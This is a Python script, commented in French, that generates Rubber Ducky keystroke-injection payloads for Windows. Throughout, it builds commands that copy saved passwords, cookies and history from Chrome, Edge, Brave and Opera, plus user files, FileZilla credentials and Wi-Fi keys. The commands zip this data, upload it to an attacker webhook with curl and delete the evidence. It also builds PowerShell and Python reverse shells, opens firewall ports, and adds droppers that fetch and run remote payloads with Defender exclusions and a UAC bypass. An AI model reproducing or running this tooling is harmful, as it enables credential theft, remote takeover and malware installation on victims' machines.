import base64, os

# Déclarations préalables
navi = False
compressor = """powershell Compress-Archive -Path 'AppData\\Local\\Temp\\STEALER' -DestinationPath 'AppData\\Local\\Temp\\Stealer.zip' """
removevidences = """rmdir /s /q "AppData\Local\\Temp\\Stealer" """


def initfile(filename, cmdUSE): # init file to write
    with open(filename, 'w') as file:
        file.write("DELAY 250\n")
        file.write("GUI r\n")
        file.write("DELAY 500\n")
        
        if cmdUSE == "yes":
            file.write("STRING cmd\n")  
            file.write("ENTER\n")
            file.write("DELAY 1000\n")
            file.write("STRING ")
            
        elif cmdUSE == "runas":
            file.write("STRING powershell Start-Process cmd -Verb runAs\n") # runas CMD with powershell
            file.write("ENTER\n")
            file.write("DELAY 2000\n")
            file.write("LEFTARROW\nENTER\n") 
            file.write("DELAY 2000\n")
            file.write("STRING ")            
            
        else:
            pass

#########################################################
# ====================== Browsers ===================== #
#########################################################

chromeX = """mkdir "AppData\\Local\\Temp\\Stealer\\Chrome" & copy "AppData\\Local\\Google\\Chrome\\User Data\\Local State" "AppData\\Local\\Temp\\Stealer\\Chrome" & copy "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data" "AppData\\Local\\Temp\\Stealer\\Chrome" & copy "AppData\\Local\\Google\\Chrome\\User Data\\Default\\History" "AppData\\Local\\Temp\\Stealer\\Chrome" & copy "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" "AppData\\Local\\Temp\\Stealer\\Chrome" & copy "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" "AppData\\Local\\Temp\\Stealer\\Chrome" """
edgeX = """mkdir "AppData\\Local\\Temp\\Stealer\\Edge" & copy "AppData\\Local\\Microsoft\\Edge\\User Data\\Local State" "AppData\Local\\Temp\\Stealer\\Edge" & copy "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data" "AppData\\Local\\Temp\\Stealer\\Edge" & copy "AppData\\Local\Microsoft\\Edge\\User Data\\Default\\History" "AppData\\Local\\Temp\\Stealer\\Edge" & copy "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data" "AppData\\Local\\Temp\\Stealer\\Edge" & copy "AppData\\Local\Microsoft\\Edge\\User Data\\Default\\Network\Cookies" "AppData\\Local\\Temp\\Stealer\\Edge" """
braveX ="""mkdir "AppData\\Local\\Temp\\Stealer\\Brave" & copy "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State" "AppData\\Local\\Temp\\Stealer\\Brave" & copy "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Web Data" "AppData\\Local\\Temp\\Stealer\\Brave" & copy "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History" "AppData\\Local\\Temp\\Stealer\\Brave" & copy "AppData\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data" "AppData\\Local\\Temp\\Stealer\\Brave" & copy "AppData\\Local\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies" "AppData\\Local\\Temp\\Stealer\\Brave" """
operaX = """mkdir "AppData\\Local\\Temp\\Stealer\\Opera" & copy "AppData\\Roaming\\Opera Software\\Opera Stable\\Local State" "AppData\\Local\\Temp\\Stealer\\Opera" & copy "AppData\Roaming\\Opera Software\\Opera Stable\\Default\\Web Data" "AppData\\Local\\Temp\\Stealer\\Opera" & copy "AppData\\Roaming\\Opera Software\\Opera Stable\\Default\\History" "AppData\\Local\\Temp\\Stealer\\Opera" & copy "AppData\\Roaming\\Opera Software\\Opera Stable\\Default\\Login Data" "AppData\\Local\\Temp\\Stealer\\Opera" & copy "AppData\\Roaming\\Opera Software\\Opera Stable\\Default\\Network\\Cookies" "AppData\\Local\\Temp\\Stealer\\Opera" """

chromkill = "taskkill /F /IM Chrome.exe "
edgekill = "taskkill /F /IM msedge.exe "
bravekill = "taskkill /F /IM brave.exe "
operakill = "taskkill /F /IM Opera.exe "


def killnav(request): 
    if request == "y":
        navi = True
    else:
        navi = False 

def chrome(): 
    with open("Webbrowsers_stealer.txt", 'a') as file:
        if navi == True:
            file.write(chromkill + "& ")            
        else:
            pass
        file.write(chromeX + "& ")

def edge():  
    with open("Webbrowsers_stealer.txt", 'a') as file:
        if navi == True:
            file.write(edgekill + "& ")            
        else:
            pass
        file.write(edgeX + "& ")

def brave(): 
    with open("Webbrowsers_stealer.txt", 'a') as file:
        if navi == True:
            file.write(bravekill + "& ")            
        else:
            pass
        file.write(braveX + "& ")

def opera(): 
    with open("Webbrowsers_stealer.txt", 'a') as file:
        if navi == True:
            file.write(operakill + "& ")            
        else:
            pass
        file.write(operaX + "& ")

def cloturebrowser(link):
    message = "Webbrowser Stealer" # Set webhook main message
    sendit = f"""curl -X POST -H "Content-Type: multipart/form-data" -F "file=@AppData\\Local\\Temp\\Stealer.zip" -F "content={message}" -F "username=RubberDucky" {link} """
    with open("Webbrowsers_stealer.txt", 'a') as file:
        file.write(compressor + "& ")
        file.write(sendit + "& ")
        file.write(removevidences + "& exit\n")
        file.write("DELAY 250\nENTER")

        
#########################################################
# ======================= Files ======================= #
#########################################################

mkdirdesktop = """mkdir "AppData\\Local\\Temp\\Stealer\\Desktop" """
mkdirdownload = """mkdir "AppData\\Local\\Temp\\Stealer\\download" """
mkdirdocuments = """mkdir "AppData\\Local\\Temp\\Stealer\\documents" """


def documentsGET(ext_list):
    with open("Files_stealer.txt", 'a') as file:
        file.write(mkdirdocuments + "& ")
        for ext in ext_list.split(','):
            documentsX = f"""copy "%userprofile%\\documents\\*{ext.strip()}" "AppData\\Local\\Temp\\Stealer\\documents" """
            file.write(documentsX + "& ")

def downloadsGET(ext_list):
    with open("Files_stealer.txt", 'a') as file:
        file.write(mkdirdownload + "& ")
        for ext in ext_list.split(','):
            downloadsX = f"""copy "%userprofile%\\download\\*{ext.strip()}" "AppData\\Local\\Temp\\Stealer\\download" """
            file.write(downloadsX + "& ")

def desktopGET(ext_list):
    with open("Files_stealer.txt", 'a') as file:
        file.write(mkdirdesktop + "& ")
        for ext in ext_list.split(','):
            desktopX = f"""copy "%userprofile%\\Desktop\\*{ext.strip()}" "AppData\\Local\\Temp\\Stealer\\Desktop" """
            file.write(desktopX + "& ")

def cloturefiles(link):
    message = "Files Stealer" # Set webhook main message
    sendit = f"""curl -X POST -H "Content-Type: multipart/form-data" -F "file=@AppData\\Local\\Temp\\Stealer.zip" -F "content={message}" -F "username=RubberDucky" {link} """
    with open("Files_stealer.txt", 'a') as file:
        file.write(compressor + "& ")
        file.write(sendit + "& ")
        file.write(removevidences + "& exit\n")
        file.write("DELAY 250\nENTER")
        
        
#########################################################
# ===================== FileZellia ==================== #
#########################################################

def cloturefileZellia(link):
    message = "FileZilla Stealer" # Set webhook main message
    mkdirFileZellia = """mkdir "AppData\\Local\\Temp\\Stealer\\FileZellia" """
    FileZelliaCopy = """copy "%APPDATA%\\FileZilla\\FileZilla.xml" "AppData\\Local\\Temp\\Stealer\\FileZellia" """
    sendit = f"""curl -X POST -H "Content-Type: multipart/form-data" -F "file=@AppData\\Local\\Temp\\Stealer.zip" -F "content={message}" -F "username=RubberDucky" {link} """

    with open("FileZilla_stealer.txt", 'a') as file:
        file.write(mkdirFileZellia + "& ")
        file.write(FileZelliaCopy + "& ")
        file.write(compressor + "& ")
        file.write(sendit + "& ")
        file.write(removevidences + "& exit\n")
        file.write("DELAY 250\nENTER")
        
        
#########################################################
# ===================== Wifi creds ==================== #
#########################################################

def cloturewificreds(link):
    message = "Wifi Creds Stealer" # Set webhook main message
    initcreds = """cmd /k cd "%USERPROFILE%\Desktop" && for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> wifipass.txt """
    sendcreds = f"""curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\\Users\\Administrateur\\Desktop\\wifipass.txt" -F "content={message}" -F "username=RubberDucky" {link} """
    delcreds = """del .\\wifipass.txt """
    with open("Wifi_stealer.txt", 'a') as file:
        file.write(initcreds)
        file.write("\nDELAY 250\nENTER")
        file.write("\nDELAY 7000")
        file.write("\nSTRING " + sendcreds + "& ")
        file.write(delcreds + "& exit")
        file.write("\nDELAY 250\nENTER")

#########################################################
# ====================== OS_access ==================== #
#########################################################
def keypad():
    script = """DELAY 250
GUI r
DELAY 500
STRING osk
DELAY 250
ENTER """

    with open("Windows_keypad.txt", 'w') as file:
        file.write(script)
        
        
#########################################################
# ====================== Backdoor ===================== #
#########################################################

def backport(name_rule, port): # open port to firewall
    
    variable = f"""netsh advfirewall firewall add rule name="{name_rule}" dir=in action=allow protocol=TCP localport={port} """
    with open("Backdoor_port.txt", 'a') as file:
        file.write(variable + "& exit")
        file.write("\nENTER")


def backport(ESSID, PASSWORD): # set new wifi hotspot
    hot = f"""netsh wlan set hostednetwork ssid={ESSID}  key={PASSWORD} & netsh wlan start hostednetwork """
    with open("Backdoor_hotspot.txt", 'a') as file:
        file.write(hot + "& exit")
        file.write("\nENTER")

def reverseshell(IPaddr, Port): # Base64 encode --> Detected by windows defender you should use obfuscation methods next   
    reverser = "c3RhcnQgcG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICIkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50"
    ipX = f"('{IPaddr}',"  
    portX = f"{Port})" 
    reverser2 = "OyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApeyRkYXRhID0gKE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwgJGkpOyRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcgKTskc2VuZGJhY2syICA9ICRzZW5kYmFjayArICcjICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCkiIA=="

    with open("Backdoor_ReverseShell.txt", 'a') as file:
        file.write(base64.b64decode(reverser).decode('utf-8'))
        file.write(ipX)
        file.write(portX)
        file.write(base64.b64decode(reverser2).decode('utf-8'))
        file.write("\nENTER")
        file.write("\nDELAY 2500")
        file.write("\nSTRING exit")
        file.write("\nENTER")

def reverseshellPython(IPaddr, Port):
    script = f"""import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()
def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{IPaddr}",{Port}))
p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()
p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()
try:
    p.wait()
except KeyboardInterrupt:
    s.close()"""

    one = """start powershell -WindowStyle Hidden -command "$encodedScript = '"""
    two = """'; $decodedScript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedScript)); Set-Content -Path 'temp_script.py' -Value $decodedScript; python temp_script.py; Remove-Item 'temp_script.py'" """
    encoded = base64.b64encode(script.encode("utf-8")).decode("utf-8")

    with open("Backdoor_ReverseShellPython.txt", 'a') as file:
        file.write(one + encoded + two)
        file.write("\nENTER")
        file.write("\nDELAY 2500")
        file.write("\nSTRING exit")
        file.write("\nENTER")


#########################################################
# ====================== PC Infos ===================== #
#########################################################

def PCInfosget(link):
    message = "PC Infos Stealer" # Set webhook main message
    grab = """(systeminfo & echo. & ipconfig /all & echo. & tasklist & echo. & netstat -ano & echo. & wmic logicaldisk list brief & echo. & net start & echo. & net user & echo. & icacls C:\\ & echo. & secedit /export /areas USER_RIGHTS /cfg secpol.txt & echo. & netsh advfirewall show allprofiles & echo. & reg query "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters" & echo. & reg query "HKEY_LOCAL_MACHINE\\SOFTWARE\Microsoft\\Windows\\CurrentVersion\\Policies\\System" & echo. & gpresult /SCOPE COMPUTER /Z & echo. & gpresult /SCOPE USER /Z & echo. & schtasks /query /fo LIST & echo. & net accounts & echo. & net session & echo. & net share & echo. & net group) > toutes_informations.txt """
    killit = """del PC_Infos.txt """
    sendcreds = f"""curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\\Users\\Administrateur\\Desktop\\wifipass.txt" -F "content={message}" -F "username=RubberDucky" {link} """
    
    with open("PCInfos_stealer.txt", 'a') as file:
        file.write(grab + "& ")
        file.write(sendcreds + "& ")
        file.write(killit + "& exit")
        file.write("\nENTER")


#########################################################
# ================= All in One stealer ================ #
#########################################################

def documentsGET1(ext_list):
    with open("All_In_One_stealer.txt", 'a') as file:
        file.write(mkdirdocuments + "& ")
        for ext in ext_list.split(','):
            documentsX = f"""copy "%userprofile%\\documents\\*{ext.strip()}" "AppData\\Local\\Temp\\Stealer\\documents" """
            file.write(documentsX + "& ")

def downloadsGET1(ext_list):
    with open("All_In_One_stealer.txt", 'a') as file:
        file.write(mkdirdownload + "& ")
        for ext in ext_list.split(','):
            downloadsX = f"""copy "%userprofile%\\download\\*{ext.strip()}" "AppData\\Local\\Temp\\Stealer\\download" """
            file.write(downloadsX + "& ")

def desktopGET1(ext_list):
    with open("All_In_One_stealer.txt", 'a') as file:
        file.write(mkdirdesktop + "& ")
        for ext in ext_list.split(','):
            desktopX = f"""copy "%userprofile%\\Desktop\\*{ext.strip()}" "AppData\\Local\\Temp\\Stealer\\Desktop" """
            file.write(desktopX + "& ")

def chrome1(): 
    with open("All_In_One_stealer.txt", 'a') as file:
        if navi == True:
            file.write(chromkill + "& ")            
        else:
            pass
        file.write(chromeX + "& ")

def edge1():  
    with open("All_In_One_stealer.txt", 'a') as file:
        if navi == True:
            file.write(edgekill + "& ")            
        else:
            pass
        file.write(edgeX + "& ")

def brave1(): 
    with open("All_In_One_stealer.txt", 'a') as file:
        if navi == True:
            file.write(bravekill + "& ")            
        else:
            pass
        file.write(braveX + "& ")

def opera1(): 
    with open("All_In_One_stealer.txt", 'a') as file:
        if navi == True:
            file.write(operakill + "& ")            
        else:
            pass
        file.write(operaX + "& ")



def wifitit(link):
    initcreds = """cmd /k cd "%USERPROFILE%\\AppData\\Local\\Temp\\Stealer" && for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear >> wifipass.txt """
    sendit = f"""curl -X POST -H "Content-Type: multipart/form-data" -F "file=@AppData\\Local\\Temp\\Stealer.zip" -F "content=All in one stealer" -F "username=RubberDucky" {link} """
    
    with open("All_In_One_stealer.txt", 'a') as file:
        file.write("exit\nENTER\n")
        file.write("DELAY 250\n")
        file.write("GUI r\n")
        file.write("DELAY 500\n")
        file.write("STRING cmd\n")  
        file.write("ENTER\n")
        file.write("DELAY 1000\n")
        file.write("STRING " + initcreds)
        file.write("\nDELAY 250\nENTER\n")
        file.write("DELAY 7000\n")
        file.write("STRING cd %USERPROFILE%\nENTER\nDELAY 250\n")
        file.write("STRING " + compressor + "& " + sendit + "& ")
        file.write(removevidences + "& exit")
        file.write("\nDELAY 250\nENTER")


def closefinal(link):
    sendit = f"""curl -X POST -H "Content-Type: multipart/form-data" -F "file=@AppData\\Local\\Temp\\Stealer.zip" -F "content=All in one stealer" -F "username=RubberDucky" {link} """
    
    with open("All_In_One_stealer.txt", 'a') as file:
        file.write(compressor + "& " + sendit + "& exit")
        file.write("\nDELAY 250\nENTER")
        
        
#########################################################
# ====================== Dropper ====================== #
#########################################################

def mode1(save, link):
    curl = f"""curl -o {save} {link} & start {save} """ 
    with open("Download_execute.txt", 'a') as file:
        file.write(curl + "& exit")
        file.write("\nENTER")
        

def mode2(save, link):
    chemin_complet = save
    chemin_complet = os.path.expandvars(save)
    dossier = os.path.dirname(chemin_complet)
    curl = f"""powershell -Command "Set-MpPreference -ExclusionPath '%USERPROFILE%\\{save}'" & powershell -Command "Set-MpPreference -ExclusionPath '{dossier}'" & curl -o %USERPROFILE%\\{save} {link} & start %USERPROFILE%\\{save} """ 
    with open("Download_execute_antiDefender.txt", 'a') as file:
        file.write(curl + "& exit")
        file.write("\nENTER")


def mode3(save, link):

    Baddy = """DELAY 250
GUI r
DELAY 500
STRING msconfig
DELAY 250
ENTER
DELAY 1000
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
RIGHT
DELAY 150
TAB
DELAY 250
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
DOWNARROW
DELAY 150
TAB
DELAY 250
TAB
DELAY 250
ENTER
DELAY 1000
STRING mode con:cols=18 lines=1 & taskkill /f /im msconfig.exe 
DELAY 250
ENTER
DELAY 1000 
STRING """

    chemin_complet = save
    chemin_complet = os.path.expandvars(save)
    dossier = os.path.dirname(chemin_complet)
    curl = f"""powershell -Command "Set-MpPreference -ExclusionPath '%USERPROFILE%\\{save}'" & powershell -Command "Set-MpPreference -ExclusionPath '{dossier}'" & curl -o %USERPROFILE%\\{save} {link} & start %USERPROFILE%\\{save} """ 
    with open("Dropper_UAC_Bypass.txt", 'w') as file:
        file.write(Baddy)
        file.write(curl + "& exit")
        file.write("\nENTER")
        
        
def drop64(link):
    payload = f"""curl -o file.txt {link} & certutil -decode file.txt svchost.exe & start svchost.exe """
    with open("Base64_Dropper.txt", 'w') as file:
        file.write(payload + "& exit")
        file.write("\nENTER")